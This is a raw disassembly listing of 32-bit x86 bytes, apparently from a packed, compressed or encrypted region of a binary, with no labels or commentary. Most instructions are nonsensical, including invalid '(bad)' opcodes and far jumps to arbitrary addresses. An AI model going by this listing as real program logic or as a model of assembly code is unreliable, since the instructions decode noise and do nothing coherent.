  41c6dc:	and    DWORD PTR [edx+eiz*4],ecx
  41c6df:	rol    ebp,1
  41c6e1:	imul   esi,DWORD PTR [edx],0xffffffc9
  41c6e4:	adc    al,0x37
  41c6e6:	sbb    al,dl
  41c6e8:	mov    cl,0x43
  41c6ea:	push   eax
  41c6eb:	call   0x86e797b8
  41c6f0:	rcl    bl,0xf1
  41c6f3:	retf   
  41c6f4:	sub    BYTE PTR [edi-0x7d],dh
  41c6f7:	jbe    0x41c6da
  41c6f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6fa:	xchg   ecx,eax
  41c6fb:	adc    edx,edi
  41c6fd:	loope  0x41c72e
  41c6ff:	fnsave [eax-0x13ef594d]
  41c705:	idiv   BYTE PTR [ebx]
  41c707:	popa   
  41c708:	xor    BYTE PTR [esp+ebp*1-0x30e5fbaa],0xbc
  41c710:	fwait
  41c711:	(bad)
  41c715:	stos   DWORD PTR es:[edi],eax
  41c716:	arpl   dx,ax
  41c718:	ror    bl,cl
  41c71a:	cmp    DWORD PTR [edi],edi
  41c71c:	mov    edi,0x6876d083
  41c721:	pop    ecx
  41c722:	pushf  
  41c723:	loop   0x41c705
  41c725:	inc    ebx
  41c726:	loopne 0x41c71b
  41c728:	push   0x36971d2e
  41c72d:	fldenv [esi]
  41c72f:	jmp    0xc210:0xd5511c8b
  41c736:	and    BYTE PTR [eax+0x11],0x8
  41c73a:	mov    bl,0x33
  41c73c:	push   esp
  41c73d:	adc    DWORD PTR [ebp+0x31],edi
  41c740:	push   edi
	...
  41c7b1:	add    BYTE PTR [eax],al
  41c7b3:	add    BYTE PTR [edx-0x8b13804],cl
  41c7b9:	jg     0x41c746
  41c7bb:	cld    
  41c7bc:	add    edi,esp
  41c7be:	adc    eax,0x23fe5a54
  41c7c3:	sbb    edx,DWORD PTR [ecx]
  41c7c5:	xor    eax,DWORD PTR [ecx]
  41c7c7:	add    ch,dh
  41c7c9:	add    BYTE PTR [eax],al
  41c7cb:	add    ch,ah
  41c7cd:	add    al,bl
  41c7cf:	xchg   ebp,eax
  41c7d0:	push   edx
  41c7d1:	addr16 xchg ecx,eax
  41c7d3:	push   0x61
  41c7d5:	adc    al,0xfe
  41c7d7:	mov    ch,0x13
  41c7d9:	mov    ebx,DWORD PTR [ebx-0x6f]
  41c7dc:	not    ecx
  41c7de:	mov    ?,esp
  41c7e0:	sub    dh,BYTE PTR [ecx-0x7c2b28ac]
  41c7e6:	std    
  41c7e7:	bound  eax,QWORD PTR [esi+0x65]
  41c7ea:	out    dx,eax
  41c7eb:	push   0xffffffaa
  41c7ed:	inc    ebp
  41c7ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7ef:	imul   eax,DWORD PTR [esi],0x4e
  41c7f2:	gs int3 
  41c7f4:	inc    ebx
  41c7f5:	retf   0xaf34
  41c7f8:	aad    0x32
  41c7fa:	cmovbe edi,esp
  41c7fd:	ret    0x6196
  41c800:	outs   dx,BYTE PTR ds:[esi]
  41c801:	add    BYTE PTR [ebx+0x2c],al
  41c804:	mov    eax,ds:0x94783909
  41c809:	adc    ch,BYTE PTR [ecx-0x40e6f76d]
  41c80f:	inc    esi
  41c810:	cmp    al,0x62
  41c812:	test   DWORD PTR [eax-0x406b9daa],0xa1065538
  41c81c:	and    BYTE PTR [ebp*8-0x2e54bff4],dl
  41c823:	ss inc ecx
  41c825:	daa    
  41c826:	add    DWORD PTR [edi],esp
  41c828:	jg     0x41c874
  41c82a:	out    dx,eax
  41c82b:	test   BYTE PTR es:[esp+esi*8-0x3b807624],bl
  41c833:	jmp    0xe56160b4
  41c838:	sbb    BYTE PTR [edx-0x17],al
  41c83b:	mov    DWORD PTR [eax-0x11f0de68],esp
  41c841:	sub    eax,DWORD PTR [ecx+eax*2-0x54932259]
  41c848:	inc    ebp
  41c849:	out    dx,eax
  41c84a:	cwde   
  41c84b:	jmp    0xec76:0x6061bbdc
  41c852:	nop
  41c853:	xor    al,bl
  41c855:	sbb    ecx,ebp
  41c857:	push   ss
  41c858:	and    eax,0x408bcd57
  41c85d:	lahf   
  41c85e:	dec    ecx
  41c85f:	int3   
  41c860:	test   al,0x31
  41c862:	push   edi
  41c863:	lods   al,BYTE PTR ds:[esi]
  41c864:	sbb    edx,esp
  41c866:	dec    edi
  41c867:	outs   dx,DWORD PTR ds:[esi]
  41c868:	in     eax,0xb2
  41c86a:	out    0x48,eax
  41c86c:	das    
  41c86d:	pop    edx
  41c86e:	mov    bl,0x94
  41c870:	retf   0xbeb9
  41c873:	stos   DWORD PTR es:[edi],eax
  41c874:	jg     0x41c8c7
  41c876:	dec    esi
  41c877:	jp     0x41c832
  41c879:	pop    ss
  41c87a:	dec    eax
  41c87b:	jnp    0x41c87a
  41c87d:	push   ebx
  41c87e:	and    ecx,DWORD PTR ds:0x500e82b7
  41c884:	in     al,0x75
  41c886:	sahf   
  41c887:	mov    cl,0x86
  41c889:	xor    al,0x63
  41c88b:	scas   eax,DWORD PTR es:[edi]
  41c88c:	imul   esi,DWORD PTR [ecx-0x39057164],0xffffff89
  41c893:	mov    esi,0x381b970f
  41c898:	dec    ecx
  41c899:	xchg   edi,eax
  41c89a:	xor    eax,0x59a2b517
  41c89f:	add    eax,0x891ced2e
  41c8a4:	xchg   esp,eax
  41c8a5:	cld    
  41c8a6:	inc    eax
  41c8a7:	aam    0x59
  41c8a9:	hlt    
  41c8aa:	dec    edx
  41c8ab:	nop
  41c8ac:	or     al,0x66
  41c8ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8af:	jecxz  0x41c89d
  41c8b1:	pop    ecx
  41c8b2:	pusha  
  41c8b3:	or     BYTE PTR [eax+0x1],dh
  41c8b6:	or     al,0x4
  41c8b8:	jo     0x41c8d1
  41c8ba:	sub    esp,DWORD PTR [eax+ecx*4]
  41c8bd:	xor    cl,ah
  41c8bf:	inc    ebx
  41c8c0:	or     eax,DWORD PTR [eax]
	...
  41c932:	add    BYTE PTR [eax],al
  41c934:	ret    
  41c935:	mov    esp,0xf87f4844
  41c93a:	iret   
  41c93b:	mov    edi,0x4f0c9749
  41c940:	adc    al,dh
  41c942:	fdivr  QWORD PTR [eax]
  41c944:	push   es
  41c945:	xor    al,0x1
  41c947:	add    ch,dh
  41c949:	add    BYTE PTR [eax],al
  41c94b:	add    dh,ch
  41c94d:	xor    eax,0xd1383689
  41c952:	mov    ecx,0x243eeef1
  41c957:	add    eax,DWORD PTR [eax]
  41c959:	mov    bl,BYTE PTR ds:0xaca23508
  41c95f:	cli    
  41c960:	pop    ebx
  41c961:	mov    al,ds:0xdf851d6f
  41c966:	pop    ecx
  41c967:	data16 sti 
  41c969:	sbb    BYTE PTR [eax-0x603fc6ae],ch
  41c96f:	mul    BYTE PTR [ecx+0x4d]
  41c972:	mov    dh,bl
  41c974:	lods   eax,DWORD PTR ds:[esi]
  41c975:	fwait
  41c976:	adc    eax,0x23df50f8
  41c97b:	inc    esp
  41c97c:	fisttp QWORD PTR [edi+0x2e]
  41c97f:	cdq    
  41c980:	stos   DWORD PTR es:[edi],eax
  41c981:	or     eax,0x9fb37dc5
  41c986:	aad    0x84
  41c988:	push   ebp
  41c989:	mov    DWORD PTR [edx+ebx*1+0x72c5c0bd],edx
  41c990:	and    eax,0x8783017f
  41c995:	enter  0x3e54,0x38
  41c999:	mov    ds:0x7232fee4,eax
  41c99e:	stos   BYTE PTR es:[edi],al
  41c99f:	inc    esp
  41c9a0:	das    
  41c9a1:	es jle 0x41c96c
  41c9a4:	dec    edx
  41c9a5:	fcom   DWORD PTR [ebx-0x3]
  41c9a8:	cli    
  41c9a9:	daa    
  41c9aa:	mov    edi,0x910fc57d
  41c9af:	out    dx,eax
  41c9b0:	sbb    ch,dh
  41c9b2:	outs   dx,DWORD PTR ds:[esi]
  41c9b3:	dec    eax
  41c9b4:	sbb    BYTE PTR [eax+0x56a13372],bh
  41c9ba:	cmp    al,0xa9
  41c9bc:	mov    eax,ds:0xa737b010
  41c9c1:	imul   edi,DWORD PTR [ecx+0x78884069],0x27
  41c9c8:	push   0x627e91a2
  41c9cd:	mov    bl,0x4a
  41c9cf:	push   edi
  41c9d0:	or     eax,0xee42aadc
  41c9d5:	cmp    eax,0x6c46ace8
  41c9da:	dec    esi
  41c9db:	pushf  
  41c9dc:	rol    BYTE PTR [ebx+0x7d4c0157],cl
  41c9e2:	out    dx,eax
  41c9e3:	imul   ebp,DWORD PTR [edi-0xf1138c4],0xe7df168b
  41c9ed:	int3   
  41c9ee:	dec    ecx
  41c9ef:	cmp    esp,ebp
  41c9f1:	ret    
  41c9f2:	jae    0x41c9a4
  41c9f4:	push   ebx
  41c9f5:	adc    al,0xf4
  41c9f7:	mov    ch,0x26
  41c9f9:	(bad)  
  41c9fb:	pop    edx
  41c9fc:	or     bl,dl
  41c9fe:	dec    esp
  41c9ff:	not    BYTE PTR [eax+0x73435396]
  41ca05:	outs   dx,DWORD PTR ds:[esi]
  41ca06:	jmp    0x41ca83
  41ca08:	lea    ebx,[ebx+0x61117819]
  41ca0e:	push   ebx
  41ca0f:	js     0x41c99c
  41ca11:	std    
  41ca12:	mov    dh,0x8f
  41ca14:	hlt    
  41ca15:	jecxz  0x41c9a3
  41ca17:	imul   eax,ebp,0xa9f43902
  41ca1d:	loop   0x41ca4b
  41ca1f:	(bad)  
  41ca20:	cli    
  41ca21:	pop    ebx
  41ca22:	ins    DWORD PTR es:[edi],dx
  41ca23:	fbld   TBYTE PTR [ebx+0x55ddcb2b]
  41ca29:	cdq    
  41ca2a:	jnp    0x41ca7b
  41ca2c:	push   ebx
  41ca2d:	int3   
  41ca2e:	je     0x41c9ba
  41ca30:	dec    edx
  41ca31:	add    DWORD PTR [edx+0x7dccbdef],ebx
  41ca37:	mov    bl,0xe1
  41ca39:	sbb    al,0xd6
  41ca3b:	xchg   ebx,edi
  41ca3d:	cmp    eax,0x40e3e0
	...
  41cab2:	add    BYTE PTR [eax],al
  41cab4:	or     bh,BYTE PTR [eax-0x4048555b]
  41caba:	(bad)  
  41cabc:	sbb    eax,0x64e2887e
  41cac1:	out    0x2f,eax
  41cac3:	mov    ds:0x134fb,al
  41cac8:	cmc    
  41cac9:	add    BYTE PTR [eax],al
  41cacb:	add    BYTE PTR [ebx],dl
  41cacd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cace:	je     0x41cb1c
  41cad0:	push   eax
  41cad1:	pop    ebp
  41cad2:	lea    edx,[edx+0x10]
  41cad5:	sbb    bh,BYTE PTR [ecx+0x635c2e3]
  41cadb:	sbb    eax,0xd9129f27
  41cae0:	xor    al,0x96
  41cae2:	rcr    DWORD PTR [edi],cl
  41cae4:	cmp    DWORD PTR [ecx],ecx
  41cae6:	std    
  41cae7:	jne    0x41cb2c
  41cae9:	mov    bl,0x42
  41caeb:	mov    WORD PTR [ecx+0x6c],gs
  41caee:	lahf   
  41caef:	shl    ah,1
  41caf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caf2:	push   edx
  41caf3:	jno    0x41cb1c
  41caf5:	add    eax,0x10b4e76c
  41cafa:	xchg   edx,eax
  41cafb:	push   esi
  41cafc:	xchg   esp,eax
  41cafd:	dec    ecx
  41cafe:	outs   dx,DWORD PTR ds:[esi]
  41caff:	mov    al,0x86
  41cb01:	adc    ebx,eax
  41cb03:	sub    eax,0x8d5225a5
  41cb08:	jae    0x41caee
  41cb0a:	push   ecx
  41cb0b:	push   ss
  41cb0c:	fiadd  WORD PTR [ebp-0x21]
  41cb0f:	int    0x9c
  41cb11:	mov    esp,0x69095092
  41cb16:	jbe    0x41caf0
  41cb18:	(bad)  
  41cb1a:	xor    dh,bl
  41cb1c:	mov    bh,0x2
  41cb1e:	pusha  
  41cb1f:	push   cs
  41cb20:	icebp  
  41cb21:	jo     0x41caec
  41cb23:	push   ebx
  41cb24:	pop    esi
  41cb25:	jnp    0x41cae4
  41cb27:	gs pop ebx
  41cb29:	lock (bad) 
  41cb2b:	push   0xfeb7147f
  41cb30:	fwait
  41cb31:	dec    esi
  41cb32:	lds    edx,FWORD PTR [eax]
  41cb34:	test   al,0x66
  41cb36:	hlt    
  41cb37:	xor    DWORD PTR ds:0x75bf78aa,edi
  41cb3d:	push   0x27
  41cb3f:	push   esp
  41cb40:	cld    
  41cb41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb42:	scas   al,BYTE PTR es:[edi]
  41cb43:	enter  0x4b,0xef
  41cb47:	pop    esi
  41cb48:	in     eax,dx
  41cb49:	or     DWORD PTR [esi+0x7bd3340f],ecx
  41cb4f:	pusha  
  41cb50:	and    eax,0xa0ecfcf
  41cb55:	or     al,0x7f
  41cb57:	sub    edi,esp
  41cb59:	inc    esi
  41cb5a:	jno    0x41cb43
  41cb5c:	leave  
  41cb5d:	out    dx,al
  41cb5e:	aam    0x46
  41cb60:	ins    BYTE PTR es:[edi],dx
  41cb61:	mov    dl,0x47
  41cb63:	ins    BYTE PTR es:[edi],dx
  41cb64:	retf   0x5a64
  41cb67:	xor    al,0x8e
  41cb69:	mov    ch,0x77
  41cb6b:	dec    esi
  41cb6c:	mov    esp,0x78cb91a4
  41cb71:	daa    
  41cb72:	push   0xffffff91
  41cb74:	mov    eax,ds:0x1319f6ca
  41cb79:	(bad)  
  41cb7b:	cdq    
  41cb7c:	cmp    BYTE PTR [eax+0x6e78e000],dh
  41cb82:	mov    dh,0xcf
  41cb84:	sub    eax,0xb467467a
  41cb89:	push   esi
  41cb8a:	stos   BYTE PTR es:[edi],al
  41cb8b:	lods   al,BYTE PTR ds:[esi]
  41cb8c:	cmp    BYTE PTR [ecx+0x591e8501],ch
  41cb92:	pop    ds
  41cb93:	pushf  
  41cb94:	mov    bl,al
  41cb96:	mov    bl,0xfc
  41cb98:	push   ss
  41cb99:	(bad)  
  41cb9a:	fwait
  41cb9b:	mov    dl,0x27
  41cb9d:	push   cs
  41cb9e:	shrd   DWORD PTR [esi-0x4],ebp,cl
  41cba2:	sahf   
  41cba3:	clc    
  41cba4:	push   0xffffffbe
  41cba6:	jge    0x41cb90
  41cba8:	dec    ebx
  41cba9:	sub    eax,0x5a91df6e
  41cbae:	and    al,0x59
  41cbb0:	add    dl,BYTE PTR [ebp+0x5757607d]
  41cbb6:	addr16 jcxz 0x41cb87
  41cbba:	fs jns 0x41cc0d
  41cbbd:	xchg   ebx,eax
  41cbbe:	retf   0xdf69
	...
  41cc31:	add    BYTE PTR [eax],al
  41cc33:	add    dl,dl
  41cc35:	xor    bh,dl
  41cc37:	clc    
  41cc38:	cli    
  41cc39:	clc    
  41cc3a:	sar    BYTE PTR [edx],cl
  41cc3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3e:	inc    eax
  41cc3f:	aam    0x62
  41cc41:	retf   
  41cc42:	and    eax,DWORD PTR [esi+0x135f0]
  41cc48:	cmc    
  41cc49:	add    BYTE PTR [eax],al
  41cc4b:	add    BYTE PTR [esi+ecx*4+0x3b5530ff],al
  41cc52:	out    0x94,al
  41cc54:	jmp    0xa64e:0xd032a40e
  41cc5b:	push   ss
  41cc5c:	into   
  41cc5d:	jmp    0xacd7e3c3
  41cc62:	fsub   QWORD PTR [esi-0x5f2fb4a6]
  41cc68:	ret    0x75f8
  41cc6b:	pop    ds
  41cc6c:	daa    
  41cc6d:	arpl   WORD PTR [eax-0x17],di
  41cc70:	mov    ds:0xfbdcf93d,eax
  41cc75:	sub    ebx,DWORD PTR [eax]
  41cc77:	fisub  DWORD PTR [eax]
  41cc79:	pop    ecx
  41cc7a:	and    DWORD PTR [edi],esi
  41cc7c:	sbb    eax,0xa55fb39d
  41cc81:	push   0xffffff8c
  41cc83:	adc    bh,bh
  41cc85:	dec    esi
  41cc86:	out    dx,eax
  41cc87:	cmp    esp,esp
  41cc89:	ret    0xefa3
  41cc8c:	cld    
  41cc8d:	cli    
  41cc8e:	retfw  
  41cc90:	addr16 pop ss
  41cc92:	(bad)  
  41cc93:	call   0xb6bd4920
  41cc98:	sar    cl,cl
  41cc9a:	(bad)  
  41cc9b:	aam    0x71
  41cc9d:	sbb    al,0x50
  41cc9f:	or     esp,edi
  41cca1:	js     0x41cceb
  41cca3:	rcl    ebx,0xf4
  41cca6:	and    bl,BYTE PTR [eax+eiz*1]
  41cca9:	add    eax,0x5ab57c23
  41ccae:	push   ebx
  41ccaf:	xchg   DWORD PTR [esi],eax
  41ccb1:	adc    ebx,DWORD PTR [eax]
  41ccb3:	adc    dl,bl
  41ccb5:	push   esi
  41ccb6:	jnp    0x41cc91
  41ccb8:	(bad)  
  41ccba:	ja     0x41cc88
  41ccbc:	fadd   QWORD PTR [ecx]
  41ccbe:	(bad)  
  41ccbf:	mov    BYTE PTR [ecx],0x5e
  41ccc2:	std    
  41ccc3:	sub    BYTE PTR [ebp-0x3e7d5b39],0xc
  41ccca:	xlat   BYTE PTR ds:[ebx]
  41cccb:	mov    esi,0xf3860537
  41ccd0:	jle    0x41cc5a
  41ccd2:	sbb    edx,DWORD PTR [edx+ebp*2-0x5b222297]
  41ccd9:	or     al,0xd7
  41ccdb:	fisttp WORD PTR [esi+0x78]
  41ccde:	outs   dx,BYTE PTR ds:[esi]
  41ccdf:	mov    edi,0xb6ab517a
  41cce4:	and    DWORD PTR [edx],eax
  41cce6:	pop    ebx
  41cce7:	mov    ds:0xf9ec9f5d,al
  41ccec:	xchg   ebx,eax
  41cced:	stos   BYTE PTR es:[edi],al
  41ccee:	xlat   BYTE PTR ds:[ebx]
  41ccef:	xor    ecx,DWORD PTR [ebx-0x604624de]
  41ccf5:	js     0x41cc86
  41ccf7:	or     al,0xce
  41ccf9:	push   ebx
  41ccfa:	test   BYTE PTR [eiz*2+0x60bbf88a],al
  41cd01:	push   ecx
  41cd02:	jp     0x41cca2
  41cd04:	add    dl,BYTE PTR [edi]
  41cd06:	mov    dl,0x3d
  41cd08:	leave  
  41cd09:	inc    eax
  41cd0a:	inc    ecx
  41cd0b:	pop    edi
  41cd0c:	mov    WORD PTR [edx],?
  41cd0e:	outs   dx,BYTE PTR ds:[esi]
  41cd0f:	pop    esp
  41cd10:	add    al,0xfc
  41cd12:	mov    ecx,DWORD PTR [eax+0x1b]
  41cd15:	test   al,0xc
  41cd17:	mov    edx,0x33b1e850
  41cd1c:	and    DWORD PTR [ebx+0x48455f64],ebx
  41cd22:	dec    eax
  41cd23:	xchg   ebx,eax
  41cd24:	das    
  41cd25:	repz pusha 
  41cd27:	push   edx
  41cd28:	jecxz  0x41ccfc
  41cd2a:	adc    dh,BYTE PTR [bx+0x1c]
  41cd2e:	ret    
  41cd2f:	adc    BYTE PTR ds:0x25bb1b68,bh
  41cd35:	or     BYTE PTR [edi+0x21],dl
  41cd38:	pop    ebx
  41cd39:	add    BYTE PTR [esi-0x8],ch
  41cd3c:	hlt    
  41cd3d:	mov    bh,0xc0
  41cd3f:	popa   
  41cd40:	jmp    0x41cd45
	...
  41cdb1:	add    BYTE PTR [eax],al
  41cdb3:	add    BYTE PTR [ebp-0x63956373],al
  41cdb9:	jnp    0x41cdb2
  41cdbb:	out    dx,eax
  41cdbc:	push   ebp
  41cdbd:	call   0x54bd:0x5d76b1bb
  41cdc4:	in     eax,0x36
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	cmc    
  41cdc9:	add    BYTE PTR [eax],al
  41cdcb:	add    BYTE PTR [ebp-0x43],dl
  41cdce:	(bad)  
  41cdcf:	push   esp
  41cdd0:	outs   dx,BYTE PTR ds:[esi]
  41cdd1:	dec    ebx
  41cdd2:	and    al,BYTE PTR ds:0xf30f3b04
  41cdd8:	fld    TBYTE PTR [ecx-0x2e]
  41cddb:	cmp    al,0xe5
  41cddd:	mov    dl,0xb9
  41cddf:	cdq    
  41cde0:	sbb    esi,ecx
  41cde2:	sar    al,cl
  41cde4:	or     ecx,DWORD PTR [eax]
  41cde6:	mov    ebp,0x9e4f1998
  41cdeb:	adc    ebp,DWORD PTR [ebx]
  41cded:	or     BYTE PTR [edi],bl
  41cdef:	aas    
  41cdf0:	sub    dl,bl
  41cdf2:	dec    esi
  41cdf3:	cs ins BYTE PTR es:[edi],dx
  41cdf5:	push   0x9e148370
  41cdfa:	or     BYTE PTR [edx+0x14b9064b],al
  41ce00:	mov    ebp,0x86a79c70
  41ce05:	xor    dl,BYTE PTR fs:[ebx+ecx*1-0x25]
  41ce0a:	add    esi,DWORD PTR [ecx+0xa79e4d6]
  41ce10:	sbb    BYTE PTR [eax],dh
  41ce12:	jne    0x41ce77
  41ce14:	ins    DWORD PTR es:[edi],dx
  41ce15:	ret    0xf1dd
  41ce18:	sti    
  41ce19:	mov    ah,0xff
  41ce1b:	mov    eax,ds:0xbaf0e8b3
  41ce20:	scas   eax,DWORD PTR es:[edi]
  41ce21:	nop
  41ce22:	jne    0x41cdf8
  41ce24:	adc    DWORD PTR [ecx+0x6],ebp
  41ce27:	fist   WORD PTR [esi]
  41ce29:	aad    0x20
  41ce2b:	adc    al,0x9b
  41ce2d:	jae    0x41ce95
  41ce2f:	mov    ebp,0xf13a447c
  41ce34:	mov    dl,BYTE PTR [ebx]
  41ce36:	outs   dx,BYTE PTR ds:[esi]
  41ce37:	sub    eax,0x737966e0
  41ce3c:	and    DWORD PTR [ebx+edi*1+0x61d27782],esp
  41ce43:	sbb    BYTE PTR [esi-0xddaaafe],cl
  41ce49:	scas   al,BYTE PTR es:[edi]
  41ce4a:	cwde   
  41ce4b:	mov    bl,0xc3
  41ce4d:	addr16 push ebx
  41ce4f:	mov    al,BYTE PTR [esi-0xc]
  41ce52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce53:	pushf  
  41ce54:	retf   0xb732
  41ce57:	(bad)  
  41ce58:	sbb    bl,bh
  41ce5a:	enter  0x698d,0x74
  41ce5e:	add    eax,0xf9a392b8
  41ce63:	pop    ecx
  41ce64:	test   DWORD PTR [edi+0x6fec4753],ecx
  41ce6a:	pop    edx
  41ce6b:	ja     0x41ce1e
  41ce6d:	pop    ds
  41ce6e:	cmp    al,0x74
  41ce70:	fs lahf 
  41ce72:	adc    cl,bh
  41ce74:	pop    ebp
  41ce75:	ja     0x41ce1c
  41ce77:	leave  
  41ce78:	dec    ecx
  41ce79:	or     BYTE PTR [ebx+edx*2],cl
  41ce7c:	fxch   st(6)
  41ce7e:	mov    ebp,0x5101c974
  41ce83:	retf   
  41ce84:	jmp    edx
  41ce86:	mov    ah,0xd6
  41ce88:	push   eax
  41ce89:	dec    ecx
  41ce8a:	add    DWORD PTR ds:0xe9fc41ed,ecx
  41ce90:	or     bh,al
  41ce92:	xchg   edx,eax
  41ce93:	jg     0x41ce2f
  41ce95:	push   esp
  41ce96:	xchg   edi,eax
  41ce97:	test   DWORD PTR [ebx+0x75],0x586758e7
  41ce9e:	in     eax,0x16
  41cea0:	pop    ebx
  41cea1:	loop   0x41cf04
  41cea3:	or     BYTE PTR [edx+0x7a4da63a],cl
  41cea9:	fbstp  TBYTE PTR [eax+ebx*8]
  41ceac:	cld    
  41cead:	xchg   ebx,eax
  41ceae:	add    BYTE PTR [eax+0x356e1c5d],cl
  41ceb4:	fsubr  DWORD PTR [ecx+0x74fe653a]
  41ceba:	in     al,dx
  41cebb:	enter  0xb203,0xad
  41cebf:	mov    eax,0xb9
	...
  41cf34:	fs jae 0x41cf6a
  41cf37:	es aaa 
  41cf39:	data16 jne 0x41cfaf
  41cf3c:	cmc    
  41cf3d:	jle    0x41cf41
  41cf3f:	dec    esi
  41cf40:	bound  eax,QWORD PTR [esi-0x7d]
  41cf43:	cmp    eax,0x137da
  41cf48:	cmc    
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    BYTE PTR [esi+ebx*1-0x56bef1],ah
  41cf52:	scas   eax,DWORD PTR es:[edi]
  41cf53:	add    eax,0xb33be2c9
  41cf58:	xor    al,0x1f
  41cf5a:	add    DWORD PTR [edi-0x1f],esp
  41cf5d:	add    ecx,edi
  41cf5f:	jns    0x41cf78
  41cf61:	xor    ah,BYTE PTR [eax]
  41cf63:	aas    
  41cf64:	test   al,0xfa
  41cf66:	push   ds
  41cf67:	add    BYTE PTR [eax],cl
  41cf69:	mov    bh,0x46
  41cf6b:	stos   DWORD PTR es:[edi],eax
  41cf6c:	xchg   ebp,eax
  41cf6d:	push   0xe28babe5
  41cf72:	push   eax
  41cf73:	pop    gs
  41cf75:	retf   
  41cf76:	mov    dl,0xbe
  41cf78:	pop    ecx
  41cf79:	pushf  
  41cf7a:	out    0xe8,eax
  41cf7c:	mov    cl,0xd
  41cf7e:	cwde   
  41cf7f:	test   eax,0x46330283
  41cf84:	fwait
  41cf85:	jbe    0x41cf35
  41cf87:	test   eax,0x91ad7185
  41cf8c:	clc    
  41cf8d:	mov    ?,WORD PTR ds:0x80e29f7e
  41cf93:	sub    BYTE PTR [eax-0x49],al
  41cf96:	mov    ds:0x543621a2,al
  41cf9b:	test   bl,0x4d
  41cf9e:	cmc    
  41cf9f:	pop    esp
  41cfa0:	out    dx,al
  41cfa1:	je     0x41cf50
  41cfa3:	dec    ebx
  41cfa4:	(bad)  
  41cfa6:	xchg   ebp,eax
  41cfa7:	fiadd  DWORD PTR [edi]
  41cfa9:	std    
  41cfaa:	pop    esi
  41cfab:	fdiv   QWORD PTR [esi+eiz*2-0x4792977f]
  41cfb2:	idiv   DWORD PTR [ebx]
  41cfb4:	pop    es
  41cfb5:	jmp    0x9b52b3b5
  41cfba:	xor    al,0xf9
  41cfbc:	mov    al,ds:0xdd52f59c
  41cfc1:	ficomp WORD PTR [ebx]
  41cfc3:	push   0x6a
  41cfc5:	addr16 mov esi,0x916c5b66
  41cfcb:	sbb    eax,DWORD PTR [ebx+0x45]
  41cfce:	ss fdivr st(7),st
  41cfd1:	and    DWORD PTR [ebx+0x3151906c],ebp
  41cfd7:	jmp    0xaa338bde
  41cfdc:	call   0x8bee19cd
  41cfe1:	hlt    
  41cfe2:	or     ax,0xb408
  41cfe6:	sbb    edx,eax
  41cfe8:	dec    esp
  41cfe9:	out    0x4e,al
  41cfeb:	or     edi,DWORD PTR [edi+eax*4+0x1f0c164c]
  41cff2:	jecxz  0x41d02c
  41cff4:	es jecxz 0x41d01f
  41cff7:	enter  0xa12,0x95
  41cffb:	or     bl,bh
  41cffd:	jmp    0xade:0xebd1afe6
  41d004:	add    bl,bl
  41d006:	fistp  QWORD PTR [eax+0x11]
  41d009:	and    DWORD PTR [edi+0x11984ced],0x7fa8b969
  41d013:	push   ds
  41d014:	mov    edx,0x51de2159
  41d019:	mov    esp,0xbece5a78
  41d01e:	jl     0x41d086
  41d020:	icebp  
  41d021:	cmp    BYTE PTR [ebp-0x3d2ce132],cl
  41d027:	dec    eax
  41d028:	cmp    DWORD PTR [eax-0x67],esi
  41d02b:	in     al,dx
  41d02c:	cmp    ecx,DWORD PTR [eax-0xad4a2a7]
  41d032:	jo     0x41cfe5
  41d034:	icebp  
  41d035:	ja     0x41d032
  41d037:	cmp    ebp,ebp
  41d039:	test   al,0x77
  41d03b:	xlat   BYTE PTR ds:[ebx]
  41d03c:	cmp    bl,BYTE PTR [eax]
  41d03e:	das    
  41d03f:	sbb    dl,BYTE PTR [edi+0x0]
	...
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    cl,bl
  41d0b5:	dec    edx
  41d0b6:	mov    eax,ds:0xd9fbb3f8
  41d0bb:	imul   ebp,DWORD PTR [edx+0x1580a798],0x5c
  41d0c2:	adc    al,0x53
  41d0c4:	iret   
  41d0c5:	cmp    BYTE PTR [ecx],al
  41d0c7:	add    ch,dh
  41d0c9:	add    BYTE PTR [eax],al
  41d0cb:	add    BYTE PTR [eax],dl
  41d0cd:	inc    esp
  41d0ce:	push   ebp
  41d0cf:	jmp    0xa8e00b5c
  41d0d4:	(bad)  
  41d0d5:	xor    esi,eax
  41d0d7:	addr16 push ecx
  41d0d9:	mov    es,WORD PTR [esp+ebx*4+0x2e]
  41d0dd:	in     al,0x7c
  41d0df:	and    eax,0x5ef0567e
  41d0e4:	das    
  41d0e5:	call   0xf24f:0xf05397be
  41d0ec:	jnp    0x41d10b
  41d0ee:	imul   ebp,DWORD PTR [esi+eiz*4+0x5bde7753],0xffffffb1
  41d0f6:	or     bl,bh
  41d0f8:	imul   eax,DWORD PTR [eax+0x46477302],0xa
  41d0ff:	aaa    
  41d100:	inc    edi
  41d101:	jns    0x41d141
  41d103:	fs inc edi
  41d105:	outs   dx,BYTE PTR ds:[esi]
  41d106:	add    ch,ch
  41d108:	in     al,0xf5
  41d10a:	and    al,0x1e
  41d10c:	test   eax,0x3e4c3606
  41d111:	daa    
  41d112:	popa   
  41d113:	inc    ebx
  41d114:	cwde   
  41d115:	lods   al,BYTE PTR ds:[esi]
  41d116:	sbb    ebx,esi
  41d118:	sub    ah,BYTE PTR [eax+0x59]
  41d11b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d11c:	jns    0x41d14c
  41d11e:	dec    edx
  41d11f:	push   DWORD PTR ss:[ebx]
  41d122:	lea    ebp,[ebx+edi*4]
  41d125:	jne    0x41d120
  41d127:	clc    
  41d128:	repz cmp al,0x72
  41d12b:	push   cs
  41d12c:	repnz mov dh,0x96
  41d12f:	cld    
  41d130:	fnstenv [ecx+0x2e]
  41d133:	xor    eax,0xc9299962
  41d138:	sub    BYTE PTR [esi+0x122afd77],dh
  41d13e:	push   ss
  41d13f:	jg     0x41d114
  41d141:	cmp    DWORD PTR [edi+0x10],0x6e68c55a
  41d148:	inc    edi
  41d149:	or     eax,0x99de67e7
  41d14e:	ds mov ch,0xf
  41d151:	aas    
  41d152:	or     esi,DWORD PTR [ebx+esi*4+0x57]
  41d156:	sti    
